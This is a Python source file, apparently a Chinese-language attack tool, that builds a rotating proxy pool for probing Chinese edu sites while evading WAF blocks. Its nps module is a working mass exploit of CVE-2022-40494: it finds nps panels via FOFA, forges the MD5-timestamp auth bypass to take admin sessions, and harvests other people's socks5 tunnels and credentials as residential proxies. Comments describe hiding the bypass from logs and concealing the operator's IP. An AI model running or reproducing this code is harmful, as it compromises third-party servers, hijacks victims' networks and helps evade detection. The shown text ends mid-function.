#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
yuk1_proxy.py · 代理池 + 本地统一出口入口（127.0.0.1:10001）

═══ 统一口径（2026-10-02 起全场景适用）══════════════════════════════
挖洞时**不再逐个记代理地址**，一律套本地统一入口：

    curl -x http://127.0.0.1:10001 <目标URL>
    python yuk1_proxy.py serve          # 先起入口（后台常驻）

入口后端自动从池里挑活代理，转发失败自动换下一个重试——
对调用方是「一个固定地址 + 自动容错」，池子刷新对对话完全透明。
═══════════════════════════════════════════════════════════════════

用法：
  python yuk1_proxy.py serve [--port 10001] [--watch 120] [--auto-harvest 200 --auto-via <出口>]
      # 起统一入口：存活巡检 + 池子见底自动补采（--auto-via 让巡检/补采也不留本机 IP）
  python yuk1_proxy.py fetch [--cn]                         # 拉源落盘（--cn 只拉中国源）
  python yuk1_proxy.py check <url> [--cn-only] [--waf] [--limit 40] # 对目标验证（出口归属诊断 + 拦截判定）
  python yuk1_proxy.py get <url> [-X POST] [-d ...] [-H ...] # 不经 serve，直接轮转出枪
  python yuk1_proxy.py doctor <url>                         # 诊断本机出口 + 池子可用率
  python yuk1_proxy.py nps [--probe 300] [--skip-fofa] [--via 出口]  # nps 源采集（--via 让扫描不留本机 IP）

出口归属诊断（2026-10-02 新增 · 解决"代理池老掉链子"的根因）：
  check 会同时回答两件事——「能不能连」+「出口是不是中国 IP」。
  国内 edu 目标对境外/机房 IP 段默认 RST，只验连通性会把这类代理误判成可用，
  导致 check 通过、打起来全 000。**打国内目标必须看归属**。

付费住宅代理接入（打国内 edu 的正解）：
  把服务商给的代理写进 <数据目录>/paid.txt（一行一个 IP:PORT 或 user:pass@ip:PORT），
  fetch/check/serve 都会自动并入池子。住宅/移动 IP 是打 edu 唯一稳定的选择。

nps 源（2026-10-05 新增 · CVE-2022-40494 · 补国内 IP）：
  nps（ehang-io，Go 内网穿透）官方全版本未修：默认配置 auth_key 被注释 → 签名退化为
  MD5(时间戳)，任意请求带 ?auth_key=MD5(ts)&timestamp=ts 即管理员（web/controllers/base.go）。
  面板 /index/gettunnel/?type=socks5 列出全部 socks5 隧道端口，每条 = 一个 socks5 代理，
  出口在对端 npc 的网络（实测常见国内住宅电信/移动 IP）。nps 子命令自动：
  FOFA 拉候选 → 绕过探测 → 隧道枚举 → 端到端验证出网 → 并入 raw.txt/cn_raw.txt。
  降痕口径：绕过参数放 POST body（URL 无签名，nginx 日志只见普通路径）；nps 自身不记
  登录/操作日志（源码核实）；--via 让整条采集链经代理出网（不留本机 IP）。
  ⚠️ 用别人的池子：连接时序与目标元数据对 nps 控制者可见；对外发包前先判归属（nps_meta.json）。

代理纪律（配 dig-scope「被封换出口阶梯」）：
  1. 登录态 Cookie / 长期凭据禁过免费代理（不可信中间人）；一次性测试凭据可以
  2. 同一代理 ≤3 枪轮转，别把代理 IP 也送进黑名单
  3. check 用首页/静态资源轻验证，别拿重口打验证
  4. **先判防护类型再换出口**：频率防护（整站 000、几十秒自愈）降频即可，
     换代理反而更糟（代理 IP 信誉差）；只有 IP 级封禁才需要换出口
"""
import argparse
import concurrent.futures as cf
import hashlib
import io
import json
import os
import random
import select
import socket
import socketserver
import subprocess
import sys
import threading
import time
import urllib.parse
import warnings
from pathlib import Path

import requests

HOME = Path.home()
# 数据目录：env YUK1_PROXY_DATA 优先（客户端 env 注入），默认 ~/.yuk1_proxy/data
POOL_DIR = Path(os.environ.get("YUK1_PROXY_DATA", str(HOME / ".yuk1_proxy" / "data"))).expanduser()
RAW_FILE = POOL_DIR / "raw.txt"
OK_FILE = POOL_DIR / "ok.txt"
CN_RAW_FILE = POOL_DIR / "cn_raw.txt"
CN_OK_FILE = POOL_DIR / "cn_ok.txt"
PAID_FILE = POOL_DIR / "paid.txt"
NPS_RAW_FILE = POOL_DIR / "nps_raw.txt"      # nps 源采集的 socks5 代理（socks5h://[user:pass@]ip:port）
NPS_META_FILE = POOL_DIR / "nps_meta.json"   # 对应出口归属 / 客户端备注（归属先判用）

# ═══ 本地统一入口（全局统一口径：所有对话套这一个地址）═══
LOCAL_HOST = "127.0.0.1"
LOCAL_PORT = 10001

# 大端口口径：免费代理集中在这些端口；10001 段为本地统一入口侧的常见上游段
COMMON_PORTS = {80, 3128, 8080, 8081, 8888, 8000, 8008, 8443, 9999, 3129, 53281, 1080, 10001}

# ── 境外/通用免费源（打境外站、对无归属要求目标有效）──
SOURCES_DIRECT = [
    "https://proxyspace.pro/http.txt",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&ssl=all",
    "https://api.proxyscrape.com/v3/?request=getproxies&protocol=http&timeout=5000",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v2/get?type=http",
    "https://api.openproxylist.xyz/http.txt",
    "https://proxylist.geonode.com/api/proxy-list?protocols=http%2Chttps&limit=500&page=1&sort_by=lastSeen&sort_type=desc",
    "https://raw-proxy.info/api/v1/proxies?protocol=http&anonymity=elite",
]
SOURCES_GITHUB = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/generated/http_proxies.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
]
# ── 中国/亚洲源（打国内 edu 目标专用 · 2026-10-02 扩充）──
# 说明：公开的中国 HTTP 代理极稀缺且寿命短（常 <10 分钟），所以
#   ① 这里只做「应急捞一把」，真正的稳定解是 paid.txt 里的住宅代理；
#   ② check --cn-only 会过滤出口归属，避免把境外源混进来。
SOURCES_CN = [
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/countries/CN/data.txt",
    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt",
    "https://cdn.jsdelivr.net/gh/proxy4parsing/proxy-list@main/http.txt",
    "https://gh-proxy.com/https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
]
CLASH = {"http": "http://127.0.0.1:7897", "https": "http://127.0.0.1:7897"}
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
]
UA = UA_POOL[0]   # 兼容旧引用（shoot 等固定头）


def _session(direct=True):
    """独立会话：direct=True 不读系统代理（绝不干扰本机 Clash）；False 显式走 7897。
    UA 每次随机（降低固定指纹，对 WAF 与留痕都友好）。"""
    s = requests.Session()
    s.trust_env = False
    s.headers.update({"User-Agent": random.choice(UA_POOL)})
    if not direct:
        s.proxies.update(CLASH)
    return s


def _parse_lines(text, src=""):
    """从源文本提 IP:PORT；geonode 是 JSON 单独解析。"""
    rows = []
    if "geonode" in src:
        try:
            for d in json.loads(text).get("data", []):
                ip, port = d.get("ip", ""), str(d.get("port", ""))
                if ip and port.isdigit():
                    rows.append(f"{ip}:{port}")
        except Exception:
            pass
        return rows
    for l in text.splitlines():
        l = l.strip()
        if not l or ":" not in l:
            continue
        # 兼容 user:pass@ip:port 形态（付费代理）
        if "@" in l:
            l = l.rsplit("@", 1)[1]
        head, _, port = l.rpartition(":")
        if head.replace(".", "").isdigit() and port.isdigit() and 0 < int(port) < 65536:
            rows.append(f"{head}:{port}")
    return rows


# ══════════════════════════════════════════════════════════════════
# 出口归属诊断：打国内 edu 的关键判据
# ══════════════════════════════════════════════════════════════════
_GEO_CACHE = {}
_GEO_LOCK = threading.Lock()


def geo_of(ip):
    """查 IP 归属国家，返回 (country_code, country, isp)。失败返回 (None,None,None)。"""
    with _GEO_LOCK:
        if ip in _GEO_CACHE:
            return _GEO_CACHE[ip]
    code = country = isp = None
    try:
        r = _session().get(f"http://ip-api.com/json/{ip}?lang=zh-CN", timeout=6)
        if r.status_code == 200:
            d = r.json()
            code, country, isp = d.get("countryCode"), d.get("country"), d.get("isp")
    except Exception:
        pass
    with _GEO_LOCK:
        _GEO_CACHE[ip] = (code, country, isp)
    return code, country, isp


def is_cn_ip(ip):
    """私网段直接视为本机（直连），公网段查归属。"""
    parts = ip.split(".")
    if parts and parts[0] in ("127", "10", "192", "172", "0"):
        return True
    if len(parts) == 4:
        a, b = int(parts[0]), int(parts[1])
        if a == 10 or (a == 192 and b == 168) or (a == 172 and 16 <= b <= 31):
            return True
    code, _, _ = geo_of(ip)
    return code == "CN"


# ══════════════════════════════════════════════════════════════════
# 源拉取
# ══════════════════════════════════════════════════════════════════
def fetch_sources(limit_each=300, cn_only=False):
    """多源拉取 → 去重 → 大端口优先排序落盘。cn_only=True 只落中国源。"""
    POOL_DIR.mkdir(parents=True, exist_ok=True)
    sources = SOURCES_CN if cn_only else (SOURCES_CN + SOURCES_DIRECT + SOURCES_GITHUB)
    seen, out, dead = set(), [], 0
    for src in sources:
        use_clash = ("githubusercontent" in src) or ("gh-proxy" in src) or ("jsdelivr" in src)
        try:
            r = _session(direct=not use_clash).get(src, timeout=(4, 12))
            rows = _parse_lines(r.text, src)
        except Exception as e:
            dead += 1
            tag = "Clash/中转" if use_clash else "直连"
            print(f"[-] {src.split('/')[2][:40]} ({tag}): {type(e).__name__}", flush=True)
            continue
        got = 0
        for l in rows:
            if l not in seen:
                seen.add(l)
                out.append(l)
                got += 1
            if got >= limit_each:
                break
        print(f"[+] {len(rows):>5} rows from {src.split('/')[2][:40]}", flush=True)
        time.sleep(0.3)

    # 并入付费代理（优先级最高，永远排前面）
    paid = load_file(PAID_FILE)
    out = paid + [p for p in out if p not in paid]

    # 中国源池：只保留中国 IP（私网段 + CN 归属）
    if cn_only:
        kept = []
        for p in out:
            if is_cn_ip(parse_entry(p)[1]):
                kept.append(p)
        out = kept
        print(f"[*] 中国源过滤后: {len(out)} 条")

    out.sort(key=lambda p: (0 if p in paid else 1,
                            0 if parse_entry(p)[2] in COMMON_PORTS else 1))
    target = CN_RAW_FILE if cn_only else RAW_FILE
    target.write_text("\n".join(out), encoding="utf-8")
    pref = sum(1 for p in out if parse_entry(p)[2] in COMMON_PORTS)
    print(f"[*] total unique: {len(out)}（大端口 {pref} 条，付费 {len(paid)} 条）→ {target}（死源 {dead}）")
    return out


def load_file(path):
    if not Path(path).exists():
        return []
    return [l.strip() for l in io.open(path, encoding="utf-8") if l.strip() and not l.startswith("#")]


GEO_URL = "http://ip-api.com/json/?lang=zh-CN"


def parse_entry(p):
    """池条目 → (scheme, host, port, user, pw)。
    支持 ip:port（HTTP 代理）与 socks5h://[user:pass@]ip:port（nps 源）。
    """
    scheme, e = "http", p
    if e.startswith("socks5h://") or e.startswith("socks5://"):
        scheme, e = "socks5", e.split("://", 1)[1]
    elif e.startswith("http://") or e.startswith("https://"):
        e = e.split("://", 1)[1]
    user = pw = None
    if "@" in e:
        cred, _, e = e.rpartition("@")
        if ":" in cred:
            user, pw = cred.split(":", 1)
        else:
            user = cred
        user = urllib.parse.unquote(user)
        pw = urllib.parse.unquote(pw) if pw is not None else None
    host, _, port = e.rpartition(":")
    try:
        port = int(port)
    except ValueError:
        port = 0
    return scheme, host, port, user, pw


def entry_to_proxies(p):
    """池条目 → requests 的 proxies dict（带 http:// 前缀的也兼容）。"""
    if p.startswith(("socks5h://", "socks5://", "http://", "https://")):
        return {"http": p, "https": p}
    return {"http": f"http://{p}", "https": f"http://{p}"}


# ── 使用期自愈：失败拉黑（进程内）+ serve 定时巡检（重写 ok 池）──
_BLACK = {}          # 条目 -> 解禁时间戳
_BLACK_LOCK = threading.Lock()
BLACK_TTL = 600      # 秒；巡检复验成功会提前解禁
WATCH_URL = "http://www.baidu.com/"


def blacklist_add(entry, ttl=BLACK_TTL):
    with _BLACK_LOCK:
        _BLACK[entry] = time.time() + ttl
    print(f"[prune] {entry} 失败拉黑 {ttl}s", file=sys.stderr, flush=True)


def blacklist_clear(entry):
    with _BLACK_LOCK:
        _BLACK.pop(entry, None)


def filter_pool(pool):
    """剔除处于拉黑期的条目（死代理别反复踩）。"""
    now = time.time()
    with _BLACK_LOCK:
        return [p for p in pool if _BLACK.get(p, 0) < now]


# ── WAF/拦截判定（出枪自动换出口用）──
BLOCK_STATUS = {403, 405, 406, 418, 420, 429, 503}
BLOCK_MARKS = ("拦截", "封禁", "禁止访问", "访问受限", "access denied", "blocked",
               "web application firewall", "captcha", "验证码", "人机验证")


def looks_blocked(status, text=""):
    """响应是否像 WAF/风控拦截页（换出口重试的判据）。"""
    if status in BLOCK_STATUS:
        return True
    t = (text or "")[:2000].lower()
    return any(m in t for m in BLOCK_MARKS)


_DIRECT_TS = [0.0]


def _log_direct(target, extra=""):
    """直连兜底审计：漏本机 IP 的事件留痕（10s 内只记一条，防刷屏）。"""
    now = time.time()
    if now - _DIRECT_TS[0] > 10:
        _DIRECT_TS[0] = now
        print(f"[direct] {extra}直连兜底（本机 IP）: {target}", file=sys.stderr, flush=True)


# ══════════════════════════════════════════════════════════════════
# 验证
# ══════════════════════════════════════════════════════════════════
def check_one(proxy, url, timeout, need_cn=False, waf=False):
    """验证一个代理：能连 + （可选）出口是否中国 IP、（可选）响应是否被 WAF 拦截。
    socks5 条目的出口在对端网络：归属从「经代理看到的出口 IP」判定，不看代理主机 IP。"""
    try:
        s = _session()
        s.proxies.update(entry_to_proxies(proxy))
        r = s.get(url, timeout=(6, timeout), allow_redirects=True)
        if r.status_code >= 500 or len(r.content) == 0:
            return None
        if waf and looks_blocked(r.status_code, r.text):
            return None
        geo = ""
        if need_cn:
            code = country = isp = None
            if proxy.startswith(("socks5h://", "socks5://")):
                try:
                    d = s.get(GEO_URL, timeout=(6, timeout)).json()
                    code, country, isp = d.get("countryCode"), d.get("country"), d.get("isp")
                except Exception:
                    pass
            else:
                code, country, isp = geo_of(parse_entry(proxy)[1])
            if code != "CN":
                return None
            geo = f"{country}/{isp}"
        return (proxy, r.status_code, geo)
    except Exception:
        return None


def check(url, limit=40, timeout=6, workers=30, cn_only=False, pool_file=None, waf=False):
    """对目标并发验证（大端口优先），可用项写 ok.txt / cn_ok.txt。
    waf=True 时把 WAF 拦截页（403/429/验证码页等）视为不可用——用于找「真能打该目标」的出口。"""
    pf = Path(pool_file) if pool_file else (CN_RAW_FILE if cn_only else RAW_FILE)
    of = CN_OK_FILE if cn_only else OK_FILE
    if not pf.exists():
        print(f"[!] {pf.name} 不存在，先跑 fetch{' --cn' if cn_only else ''}")
        return []
    rows = load_file(pf)
    # 已验过的付费代理直接进池（付费代理质量已认证，不再消耗 check 配额）
    paid = [p for p in rows if p in set(load_file(PAID_FILE))]
    rows = [p for p in rows if p not in set(paid)] + paid
    rows = rows[: max(limit * 5, 300)]
    print(f"[*] checking {len(rows)} proxies against {url} "
          f"(workers={workers}, need_cn={cn_only})")
    ok = []
    with cf.ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(check_one, p, url, timeout, cn_only, waf): p for p in rows}
        done = 0
        for fut in cf.as_completed(futs):
            done += 1
            if done % 60 == 0:
                print(f"    {done}/{len(futs)} checked, {len(ok)} alive", flush=True)
            res = fut.result()
            if res:
                ok.append(res)
                if len(ok) >= limit:
                    break
    proxies = [r[0] for r in ok]
    for p in proxies:
        blacklist_clear(p)
    proxies.sort(key=lambda p: (0 if p in set(paid) else 1,
                                0 if parse_entry(p)[2] in COMMON_PORTS else 1))
    of.write_text("\n".join(proxies), encoding="utf-8")
    cn_hit = sum(1 for r in ok if r[2])
    print(f"[*] alive: {len(proxies)}（其中确认中国出口 {cn_hit}）-> {of}")
    return proxies


# ══════════════════════════════════════════════════════════════════
# nps 源：CVE-2022-40494 鉴权绕过 → 采集面板内 socks5 隧道端口（2026-10-05 实测打通）
# ══════════════════════════════════════════════════════════════════
# 原理：nps.conf 默认 #auth_key=test 被注释 → configKey="" → auth_key=MD5(时间戳) 即过
# web/controllers/base.go 的 Prepare() 校验，直取管理员会话（官方全版本未修，PR#1091 挂着）。
# 面板 /index/gettunnel/?type=socks5 列出全部 socks5 隧道：每条隧道的「服务器端口」
# 就是 socks5 代理，出口在对端 npc 的网络（实测=国内住宅电信/移动）。仅对端在线可用。
# ⚠️ 用别人的池子：连接时序/目标元数据对 nps 控制者全裸；对外发包前先判归属。
# nps 采集源门控：默认关闭；YUK1_PROXY_ENABLE_NPS=1（或 true/yes）启用（高级功能，见 README）
NPS_ENABLED = os.environ.get("YUK1_PROXY_ENABLE_NPS", "").strip().lower() in ("1", "true", "yes")
NPS_SOCKS5_TUNNEL_API = "/index/gettunnel/"
NPS_CLIENT_LIST_API = "/client/list/"

SCAN_VIA = None      # 采集链出口（None=直连）；nps_harvest(via=...) 设置：
                     #   ip:port / http://ip:port / socks5h://[u:p@]ip:port
                     #   设置后探测/枚举/greeting/端到端校验全程经它出网（对方只见 via 的 IP）


def _via_socket(via, host, port, timeout=10):
    """经 via 代理建一条到 host:port 的 TCP（http 用 CONNECT / socks5 用握手）。失败 None。"""
    scheme, v_host, v_port, v_user, v_pw = parse_entry(via)
    if not v_host or not v_port:
        return None
    try:
        s = socket.create_connection((v_host, v_port), timeout=timeout)
    except Exception:
        return None
    s.settimeout(timeout)
    try:
        if scheme == "socks5":
            if not _socks5_handshake(s, host, port, v_user, v_pw):
                s.close()
                return None
        else:
            s.sendall((f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n").encode())
            head = s.recv(1024)
            if b" 200 " not in head.split(b"\r\n")[0]:
                s.close()
                return None
        return s
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        return None


def _nps_api(base, path, timeout=8, **params):
    """带 auth_key 绕过参数打 nps Web API；返回 (json, err)。
    参数放 POST body：URL 里不出现签名（对方前置 nginx/访问日志只见 /client/list/ 这种普通路径）；
    SCAN_VIA 设置时经其出网（不给对方留本机 IP）。"""
    ts = int(time.time())
    form = {"auth_key": hashlib.md5(str(ts).encode()).hexdigest(), "timestamp": ts}
    form.update(params)
    try:
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")
            s = _session()
            if SCAN_VIA:
                s.proxies.update(entry_to_proxies(SCAN_VIA))
            r = s.post(base.rstrip("/") + path, data=form, timeout=timeout,
                       allow_redirects=False, verify=False)
    except Exception as e:
        return None, type(e).__name__
    if r.status_code != 200:
        return None, f"HTTP{r.status_code}"
    try:
        return r.json(), ""
    except Exception:
        return None, "non-json"


def _nps_probe_bypass(cand):
    host, _ = cand
    d, _err = _nps_api(host, NPS_CLIENT_LIST_API, offset=0, limit=100)
    if isinstance(d, dict) and "rows" in d:
        return cand, d
    return cand, None


def _nps_collect(cand):
    """命中主机 → socks5 端点（含对端在线标志与账密）。"""
    host, ip = cand
    srv = ip or host.split("://")[-1].split(":")[0]
    eps = []
    t, _err = _nps_api(host, NPS_SOCKS5_TUNNEL_API, timeout=10, offset=0, limit=1000, type="socks5")
    if t is None:
        return eps
    for row in (t.get("rows") or []):
        c = row.get("Client") or {}
        cnf = c.get("Cnf") or {}
        user, pw = cnf.get("U") or "", cnf.get("P") or ""
        ma = row.get("MultiAccount")
        if isinstance(ma, dict) and not user:
            am = ma.get("AccountMap") or {}
            if am:
                user = next(iter(am))
                pw = am.get(user) or ""
        try:
            port = int(row.get("Port") or 0)
        except (TypeError, ValueError):
            continue
        if port:
            eps.append({"srv": srv, "port": port, "online": bool(c.get("IsConnect")),
                        "user": user, "pw": pw, "addr": c.get("Addr") or "",
                        "remark": c.get("Remark") or ""})
    return eps


def _nps_entry(ep):
    cred = ""
    if ep.get("user"):
        cred = (urllib.parse.quote(str(ep["user"]), safe="") + ":"
                + urllib.parse.quote(str(ep.get("pw") or ""), safe="") + "@")
    return f"socks5h://{cred}{ep['srv']}:{ep['port']}"


def _nps_greeting(ep):
    """socks5 greeting 预筛：应答≠可用（离线对端也应答），只用于砍全死端口；
    SCAN_VIA 设置时经其建立连接。"""
    try:
        if SCAN_VIA:
            s = _via_socket(SCAN_VIA, ep["srv"], ep["port"])
            if s is None:
                return None
        else:
            s = socket.create_connection((ep["srv"], ep["port"]), timeout=5)
    except Exception:
        return None
    try:
        s.settimeout(5)
        s.sendall(b"\x05\x01\x00")
        d = s.recv(8)
        if len(d) >= 2 and d[0] == 5:
            return d[1]
    except Exception:
        pass
    finally:
        s.close()
    return None


def _nps_validate(ep):
    """端到端验证：真发请求经 socks5 出网（出口 IP 即对端网络）。
    SCAN_VIA 设置时走两跳：via → 候选 socks5 → ip-api（全程不暴露本机 IP）。"""
    entry = _nps_entry(ep)
    if SCAN_VIA:
        s = _via_socket(SCAN_VIA, ep["srv"], ep["port"], timeout=12)
        if s is None:
            return None
        buf = b""
        try:
            s.settimeout(15)
            if not _socks5_handshake(s, "ip-api.com", 80, ep.get("user") or None, ep.get("pw") or None):
                s.close()
                return None
            s.sendall(b"GET /json/?lang=zh-CN HTTP/1.1\r\nHost: ip-api.com\r\n"
                      b"User-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n")
            while len(buf) < 65536:
                try:
                    d = s.recv(8192)
                except Exception:
                    break
                if not d:
                    break
                buf += d
        finally:
            try:
                s.close()
            except Exception:
                pass
        try:
            body = buf.split(b"\r\n\r\n", 1)[-1]
            lo, hi = body.find(b"{"), body.rfind(b"}")
            if lo < 0 or hi <= lo:
                return None
            d = json.loads(body[lo:hi + 1].decode("utf-8", "replace"))
        except Exception:
            return None
        if d.get("status") == "success":
            return entry, d.get("query"), d.get("countryCode"), d.get("isp"), ep
        return None
    try:
        s2 = _session()
        s2.proxies.update(entry_to_proxies(entry))
        d = s2.get(GEO_URL, timeout=(6, 12)).json()
        if d.get("status") == "success":
            return entry, d.get("query"), d.get("countryCode"), d.get("isp"), ep
    except Exception:
        pass
    return None


def _fofa_pull(queries, size, tag):
    """经 fofa_q.py（FOFA 唯一合法通道）拉候选，返回 [(host, ip), ...]。"""
    fq_env = os.environ.get("YUK1_PROXY_FOFA_Q", "").strip()
    fq = Path(fq_env) if fq_env else Path(__file__).resolve().parent / "fofa_q.py"
    if not fq.exists():
        print(f"[fofa] 找不到 fofa_q.py（{fq}）：设 YUK1_PROXY_FOFA_Q 指向它，或用 --skip-fofa 复用已缓存候选")
        return []
    rows, seen = [], set()
    for i, (q, force_body) in enumerate(queries):
        out = POOL_DIR / f"nps_fofa_{tag}_{i}.json"
        cmd = [sys.executable, str(fq), q, "--size", str(size), "--out", str(out)]
        if force_body:
            cmd.append("--force-body")
        try:
            env = {**os.environ, "PYTHONIOENCODING": "utf-8"}
            p = subprocess.run(cmd, capture_output=True, text=True, timeout=240,
                               errors="replace", env=env)
            tail = ((p.stdout or "") + (p.stderr or "")).strip().splitlines()[-1:]
            print(f"[fofa] {q[:58]}… → {tail}")
        except Exception as e:
            print(f"[fofa] {q[:58]}… EXC {type(e).__name__}")
            continue
        try:
            d = json.load(open(out, encoding="utf-8"))
        except Exception:
            continue
        for r in d.get("results", []):
            if r and r[0] and r[0] not in seen:
                seen.add(r[0])
                rows.append((r[0], r[1] if len(r) > 1 else ""))
    return rows


def _nps_load_cached():
    rows, seen = [], set()
    for f in sorted(POOL_DIR.glob("nps_fofa_*.json")):
        try:
            d = json.load(open(f, encoding="utf-8"))
        except Exception:
            continue
        for r in d.get("results", []):
            if r and r[0] and r[0] not in seen:
                seen.add(r[0])
                rows.append((r[0], r[1] if len(r) > 1 else ""))
    return rows


def nps_harvest(fofa_size=3000, probe=200, workers=60, ep_cap=400, keep_all=False,
                skip_fofa=False, via=None):
    """nps 源主流程：FOFA → 绕过探测 → 隧道枚举 → greeting 预筛 → 端到端验证 → 入池。
    via=采集链出口（ip:port / http://ip:port / socks5h://…）：探测/枚举/校验全程经它出网，
    对方访问日志/防火墙只见 via 的 IP；None=直连（暴露本机 IP）。"""
    global SCAN_VIA
    if not NPS_ENABLED:
        print("[nps] 未启用：把插件选项 enable_nps 置 1（env YUK1_PROXY_ENABLE_NPS=1）后可用；见 README 的使用边界说明")
        return []
    SCAN_VIA = via
    t0 = time.time()
    if skip_fofa:
        cands = _nps_load_cached()
        print(f"[*] 复用已落盘 FOFA 候选：{len(cands)}")
    else:
        cands = _fofa_pull([
            ('app="nps" && country="CN"', False),
            ('app="nps" && country="CN" && port="8080"', False),
            ('app="nps" && country="CN" && port="80"', False),
            ('body="loginColumns animated fadeInDown" && country="CN"', True),
        ], fofa_size, time.strftime("%m%d"))
    if not cands:
        print("[!] 无候选，退出")
        return []
    # 轮转取窗：探测位置持久化，多轮运行系统覆盖全部候选（避免每轮都从同一批开头重扫）
    off_file = POOL_DIR / "nps_probe_offset.txt"
    try:
        off = int(off_file.read_text(encoding="utf-8").strip())
    except Exception:
        off = 0
    off %= max(1, len(cands))
    todo = (cands + cands)[off:off + probe]
    random.shuffle(todo)   # 探测顺序随机化（不留顺序扫描特征）
    off_file.write_text(str((off + probe) % len(cands)), encoding="utf-8")
    print(f"[*] 候选 {len(cands)}，本轮探测 {len(todo)}（offset={off}，workers={workers}，"
          f"via={via or '直连'}）")

    hits = []
    with cf.ThreadPoolExecutor(max_workers=workers) as ex:
        for cand, d in ex.map(_nps_probe_bypass, todo):
            if d is not None:
                hits.append(cand)
                print(f"[HIT] {cand[0]} clients={d.get('total')}", flush=True)
    print(f"[*] 绕过命中: {len(hits)}/{len(todo)}")
    if not hits:
        return []

    all_eps = []
    with cf.ThreadPoolExecutor(max_workers=min(30, len(hits))) as ex:
        for eps in ex.map(_nps_collect, hits):
            all_eps.extend(eps)
    print(f"[*] socks5 端点: {len(all_eps)}（在线客户端 {sum(1 for e in all_eps if e['online'])}）")

    alive = []
    with cf.ThreadPoolExecutor(max_workers=60) as ex:
        for ep, rep in zip(all_eps, ex.map(_nps_greeting, all_eps)):
            if rep is not None:
                alive.append(ep)
    print(f"[*] greeting 通过: {len(alive)}")

    good = []
    with cf.ThreadPoolExecutor(max_workers=40) as ex:
        for res in ex.map(_nps_validate, alive[:ep_cap]):
            if res:
                entry, eip, cc, isp, ep = res
                if keep_all or cc == "CN":
                    good.append(res)
                    print(f"[OK] {entry} 出口={eip} {cc}/{isp}", flush=True)

    entries = [g[0] for g in good]
    if entries:
        eset = set(entries)
        old_nps = [l for l in load_file(NPS_RAW_FILE) if l not in eset]
        NPS_RAW_FILE.write_text("\n".join(entries + old_nps), encoding="utf-8")
        try:
            meta = json.load(open(NPS_META_FILE, encoding="utf-8"))
        except Exception:
            meta = {}
        for g in good:
            meta[g[0]] = {"egress_ip": g[1], "country": g[2], "isp": g[3], "srv": g[4]["srv"],
                          "port": g[4]["port"], "client_addr": g[4]["addr"],
                          "client_remark": g[4]["remark"], "ts": int(time.time())}
        NPS_META_FILE.write_text(json.dumps(meta, ensure_ascii=False, indent=1), encoding="utf-8")
        for f in (RAW_FILE, CN_RAW_FILE):
            old = [l for l in load_file(f) if l not in eset]
            f.write_text("\n".join(entries + old), encoding="utf-8")
        print(f"[*] 可用 socks5: {len(entries)}（CN {sum(1 for g in good if g[2] == 'CN')}）"
              f" → {NPS_RAW_FILE.name} 并并入 raw.txt / cn_raw.txt；耗时 {time.time() - t0:.0f}s")
    else:
        print(f"[!] 本轮 0 可用（保留旧 {NPS_RAW_FILE.name}）；耗时 {time.time() - t0:.0f}s")
    print("[!] 出口在对端网络：用前先判归属（nps_meta.json 有客户端备注）；面板可见连接元数据")
    return entries


# ══════════════════════════════════════════════════════════════════
# 本地统一入口（127.0.0.1:10001）
# ══════════════════════════════════════════════════════════════════
def _pool_tiers(entry_port):
    """分层取池：入口 ok 文件在前、通用 ok 在后（各自去重）；优先级不被全局洗牌冲掉。"""
    tiers, seen = [], set()
    for f in (POOL_DIR / f"ok_{entry_port}.txt", OK_FILE):
        if f.exists():
            rows = [p for p in load_file(f) if p not in seen]
            seen.update(rows)
            if rows:
                tiers.append(rows)
    return tiers


def _pool_for(entry_port):
    """按优先级合并取池（入口 ok → 通用 ok；任一文件空了不至于全无货）。"""
    return [p for tier in _pool_tiers(entry_port) for p in tier]


def _open_upstream(host, port, timeout=12):
    """TCP 连上游代理地址。返回 socket 或 None。"""
    try:
        s = socket.create_connection((host, int(port)), timeout=timeout)
        s.settimeout(30)
        return s
    except Exception:
        return None


def _socks5_handshake(sock, host, port, user=None, pw=None):
    """在已连通 socket 上完成 socks5 握手 + CONNECT（域名交对端解析= socks5h 语义）。成功 True。"""
    try:
        sock.settimeout(15)
        sock.sendall(b"\x05\x02\x00\x02" if user else b"\x05\x01\x00")
        resp = sock.recv(2)
        if len(resp) < 2 or resp[0] != 5:
            return False
        if resp[1] == 2:                       # 服务端要求账密
            if not user:
                return False
            u, p = user.encode(), (pw or "").encode()
